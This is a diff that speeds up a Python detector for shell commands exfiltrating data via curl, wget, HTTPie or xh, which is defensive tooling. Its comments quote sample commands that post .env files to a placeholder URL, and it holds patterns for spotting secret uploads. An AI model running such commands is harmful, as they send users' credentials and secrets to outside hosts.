@@ -1884,6 +1884,9 @@ _MAX_SHELL_REFERENCE_TOKENS = 256
 
 def _shell_substitution_payloads(command_text: str) -> tuple[list[str], bool]:
     """Extract active command/process substitutions without evaluating shell text."""
+    if "`" not in command_text and "$(" not in command_text and "<(" not in command_text:
+        # Text with no backtick, $( or <( holds no substitution to walk to.
+        return [], False
 
     def _group_end(start: int) -> int | None:
         depth = 1
@@ -1969,6 +1972,8 @@ def _mentions_skill_artifact(value: Any) -> bool:
 
 def _has_unquoted_secret_var(arg: str) -> bool:
     """Check if argument contains an unescaped, non-single-quoted secret environment variable."""
+    if "$" not in arg:
+        return False
     in_single = False
     in_double = False
     escaped = False
@@ -2016,8 +2021,17 @@ def _is_httpie_body_item(arg: str) -> bool:
     return eq_idx != -1
 
 
+# Runs of characters that _network_shell_tokens adds to a word as they are:
+# outside quotes, and inside double and single quotes.
+_SHELL_PLAIN_RUN_RE = re.compile(r"[^\\'\"\r\n \t;&|<>]+")
+_SHELL_QUOTED_RUN_RES = {'"': re.compile(r'[^"\\]+'), "'": re.compile(r"[^']+")}
+
+
 def _network_shell_tokens(cmd: Any) -> list[str]:
-    """Tokenize a shell command string while preserving token quote delimiters."""
+    """Tokenize a shell command string while preserving token quote delimiters.
+
+    A run of characters that only joins the current word is added at once.
+    """
     normalized = str(cmd).replace("\\\r\n", " ").replace("\\\n", " ")
     tokens: list[str] = []
     current: list[str] = []
@@ -2041,6 +2055,11 @@ def _network_shell_tokens(cmd: Any) -> list[str]:
             continue
 
         if in_quote:
+            run = _SHELL_QUOTED_RUN_RES[in_quote].match(normalized, idx)
+            if run is not None:
+                current.append(run.group())
+                idx = run.end()
+                continue
             current.append(ch)
             if ch == in_quote:
                 in_quote = None
@@ -2097,8 +2116,10 @@ def _network_shell_tokens(cmd: Any) -> list[str]:
             idx += len(operator)
             continue
 
-        current.append(ch)
-        idx += 1
+        # A character none of the above reads, and those after it, join the word.
+        run = _SHELL_PLAIN_RUN_RE.match(normalized, idx)
+        current.append(run.group() if run is not None else ch)
+        idx = run.end() if run is not None else idx + 1
 
     if current:
         tokens.append("".join(current))
@@ -2297,7 +2318,9 @@ def _httpie_ignores_stdin(executable: str, cleaned_args: list[str]) -> bool:
     """
     if "--ignore-stdin" in cleaned_args:
         return True
-    return executable in _XH_EXECUTABLES and any(_xh_cluster_ignores_stdin(arg) for arg in cleaned_args)
+    return executable in _XH_EXECUTABLES and any(
+        _xh_cluster_ignores_stdin(arg) for arg in cleaned_args if arg.startswith("-")
+    )
 
 
 def _xh_cluster_ignores_stdin(arg: str) -> bool:
@@ -2320,6 +2343,8 @@ def _httpie_stdin_off_positions(words: list[str]) -> tuple[int, int]:
     """
     httpie = xh = -1
     for index, word in enumerate(words):
+        if "-" not in word:
+            continue
         clean = word.strip("\"'")
         if clean == "--ignore-stdin":
             httpie = xh = index
@@ -2339,12 +2364,16 @@ def _xh_cluster_takes_value(arg: str) -> bool:
 
 
 def _network_client_uploads(executable: str, args: list[str], stdin_piped: bool) -> bool:
-    """Check one curl, wget, HTTPie or xh invocation's arguments for upload indicators."""
-    for arg in args:
-        if _has_unquoted_secret_var(arg):
-            return True
-        if _has_literal_secret(arg):
-            return True
+    """Check one curl, wget, HTTPie or xh invocation's arguments for upload indicators.
+
+    The secret patterns read the arguments once, as one text joined by
+    newlines, which no pattern matches across.
+    """
+    text = "\n".join(args)
+    if "$" in text and any(_has_unquoted_secret_var(arg) for arg in args):
+        return True
+    if _has_literal_secret(text):
+        return True
 
     if executable == "curl":
         i = 0
@@ -2429,7 +2458,13 @@ def _network_client_uploads(executable: str, args: list[str], stdin_piped: bool)
         i = 0
         while i < len(args):
             arg = args[i]
-            clean = arg.strip("\"'")
+            clean = cleaned_args[i]
+            if clean.isalnum():
+                # A word of letters and digits alone is no option, input or request item; it may be a method.
+                if clean.casefold() in _UNSAFE_HTTP_METHODS:
+                    return True
+                i += 1
+                continue
             if xh and (clean in _XH_VALUE_OPTIONS or _xh_cluster_takes_value(clean)):
                 # The value, as in --bearer dGVzdA= or -o out.json, is not a request item.
                 i += 2
@@ -2630,6 +2665,7 @@ def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
 
 
 _NETWORK_INPUT_REDIRECTS = ("<", "<<", "<<<", "<&", "<>")
+_NETWORK_INPUT_REDIRECT_WORDS = frozenset(_NETWORK_INPUT_REDIRECTS)
 _NETWORK_OUTPUT_REDIRECTS = (">", ">>", ">&", ">|", "&>", "&>>")
 
 
@@ -2860,7 +2896,7 @@ def _compound_reads_input(tokens: list[str]) -> bool:
         opens, closes = _compound_keywords(command)
         if opens and piped:
             return True
-        redirects_input = any(token in _NETWORK_INPUT_REDIRECTS for token in command)
+        redirects_input = not _NETWORK_INPUT_REDIRECT_WORDS.isdisjoint(command)
         if closes and redirects_input:
             return True
         has_input = has_input or redirects_input
@@ -2953,7 +2989,8 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
     # Input piped or redirected into a loop, if or { ...; } group reaches every
     # command inside it, as in "while read -r l; do http URL; done < .env".
     compound_input = _compound_reads_input(tokens)
-    names_curl_or_wget = any("://" not in token and _CURL_OR_WGET_WORD_RE.search(token) for token in tokens)
+    # Whether the action names curl or wget as a word (see below), read once when first needed.
+    names_curl_or_wget: bool | None = None
     compound_depth = 0
     case_depth = 0
     # Functions whose body is still open, with the compound depth before each
@@ -3088,14 +3125,18 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
                 return True
             if not dynamic:
                 continue
-        elif ("$" in executable or "`" in executable) and names_curl_or_wget:
+        elif "$" in executable or "`" in executable:
             # A "$VAR" or backtick command word with no recorded value, in an
             # action that names curl or wget as a word, as in "for c in curl
             # wget; do $c --post-file=.env -q URL; done", may be either
             # client, so its arguments get the curl and wget upload rules.
             # "$GREP -F https://x src/" in an action that names neither does not.
+            if names_curl_or_wget is None:
+                names_curl_or_wget = any("://" not in token and _CURL_OR_WGET_WORD_RE.search(token) for token in tokens)
             rest = command[cmd_idx + 1 :]
-            if any(_network_client_uploads(name, rest, command_stdin) for name in ("curl", "wget")):
+            if names_curl_or_wget and any(
+                _network_client_uploads(name, rest, command_stdin) for name in ("curl", "wget")
+            ):
                 return True
 
         # A printer whose output is piped on, as in "echo curl -d @.env URL |
@@ -3211,7 +3252,7 @@ def _network_tokens_exfiltrate(tokens: list[str], _depth: int) -> bool:
                         continue
                     seen_key = f"{seen_key}:ignores"
             client_args = command[sub_idx + 1 :]
-            if not keeps_stdin:
+            if not keeps_stdin and not _NETWORK_INPUT_REDIRECT_WORDS.isdisjoint(client_args):
                 client_args = [token for token in client_args if token not in _NETWORK_INPUT_REDIRECTS]
             if capitalized and not any(_may_be_header_file_item(token) for token in client_args):
                 client_args = [
@@ -7801,9 +7842,11 @@ _CODE_HINT_NOISE_RE = re.compile(r"['\"\\]")
 # upload check reads: an interpreter, a shell, a script file, or a curl or
 # wget config option or file.
 _UPLOAD_SHELL_GATE_RE = re.compile(
-    r"(?i:python|pypy|\bpy\b|node|bun|deno|ruby|perl|php|\bgo\b|\b(?:a|ba|da|k|mk|z)?sh\b"
+    # A character no word below starts with is passed over before any word is tried.
+    r"(?=(?i:[abcdgkmnprswz])|[.-])"
+    r"(?:(?i:python|pypy|\bpy\b|node|bun|deno|ruby|perl|php|\bgo\b|\b(?:a|ba|da|k|mk|z)?sh\b"
     r"|\.(?:py|[mc]?[jt]s|rb|pl|go|sh|bash)\b|curlrc|wgetrc)"
-    r"|--config|(?<![\w-])-[A-Za-z]*K"
+    r"|--config|(?<![\w-])-[A-Za-z]*K)"
 )
 # A post, put, patch, or post_form call or reference, or Go's Post or
 # PostForm method, uploads when its receiver names an HTTP client (see
